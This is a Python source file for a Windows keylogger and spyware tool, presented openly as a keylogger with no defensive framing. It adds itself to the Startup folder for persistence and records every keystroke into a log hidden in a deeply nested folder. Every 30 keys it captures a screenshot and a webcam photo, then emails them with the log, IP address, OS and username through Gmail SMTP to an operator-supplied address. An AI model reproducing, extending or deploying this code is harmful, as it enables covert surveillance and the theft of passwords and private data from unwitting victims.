import keyboard
import datetime
import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import winshell
import sys
import socket
import getpass
import platform
import pyautogui
import cv2

# Get the path of the current script
script_path = os.path.abspath(sys.argv[0])

# Define the path to the Startup folder
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\Windows\Start Menu\Programs\Startup")

# Create a shortcut to the script in the Startup folder
shortcut_path = os.path.join(startup_folder, "keylogger.lnk")
winshell.CreateShortcut(
    Path=shortcut_path,
    Target=script_path,
    Description="Keylogger",
    Icon=(script_path, 0)
)

# Define the log file path
log_file_path = os.path.expanduser("~/Documents/1/2/8/2/7/7/9/2/0/6/4/7/8/8/2/1/5/9/4/8/4/0/keylogger.log")

# Create the directory if it doesn't exist
os.makedirs(os.path.dirname(log_file_path), exist_ok=True)

# Initialize the key press counter
key_press_counter = 0

def send_email(log_file_path, screenshot_path, webcam_image_path):
    # Define the sender and receiver email addresses
    sender_email = "" #your email
    receiver_email = "" #send data to this email

    # Define the email subject
    subject = f"Keylogger Log - IP: {socket.gethostbyname(socket.gethostname())}, OS: {platform.system()}, Username: {getpass.getuser()}"

    # Create a multipart message
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    # Attach the log file to the email
    with open(log_file_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= keylogger.log",
        )
        message.attach(part)

    # Attach the screenshot to the email
    with open(screenshot_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= screenshot.png",
        )
        message.attach(part)

    # Attach the webcam image to the email
    with open(webcam_image_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename= webcam_image.png",
        )
        message.attach(part)

    # Connect to the SMTP server
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()

    # Log in to the SMTP server
    server.login(sender_email, "") #app key

    # Send the email
    server.sendmail(sender_email, receiver_email, message.as_string())

    # Close the SMTP server connection
    server.quit()

# Open the log file in append mode
with open(log_file_path, "a") as log_file:
    log_file.write("Start logging at {}\n".format(datetime.datetime.now()))

    # Define a callback function to handle keyboard events
    def on_key_event(event):
        # Check if the event is a key down event
        if event.event_type == keyboard.KEY_DOWN:
            # Write the timestamp and the pressed key to the log file
            log_file.write("{} - {}\n".format(datetime.datetime.now(), str(event.name)))
            # Flush the buffer to ensure that the key press is written to the file immediately
            log_file.flush()

            # Check if the pressed key is 'Esc'
            if event.name == 'esc':
                # If it is, ignore the event and continue listening for keyboard input
                return

            # Increment the key press counter
            global key_press_counter
            key_press_counter += 1

            # Check if 30 keys have been pressed
            if key_press_counter % 30 == 0:
                # If they have, take a screenshot
                screenshot_path = os.path.expanduser("~/Documents/1/2/8/2/7/7/9/2/0/6/4/7/8/8/2/1/5/9/4/8/4/0/screenshot.png")
                pyautogui.screenshot(screenshot_path)
                # Take a picture from the webcam
                webcam_image_path = os.path.expanduser("~/Documents/1/2/8/2/7/7/9/2/0/6/4/7/8/8/2/1/5/9/4/8/4/0/webcam_image.png")
                webcam = cv2.VideoCapture(0)
                ret, frame = webcam.read()
                cv2.imwrite(webcam_image_path, frame)
                webcam.release()
                # Send an email with the log file, the screenshot, and the webcam image as attachments
                send_email(log_file_path, screenshot_path, webcam_image_path)

    # Hook the keyboard event listener
    keyboard.hook(on_key_event)

    # Keep the script running indefinitely
    while True:
        pass

# Close the log file
log_file.close()
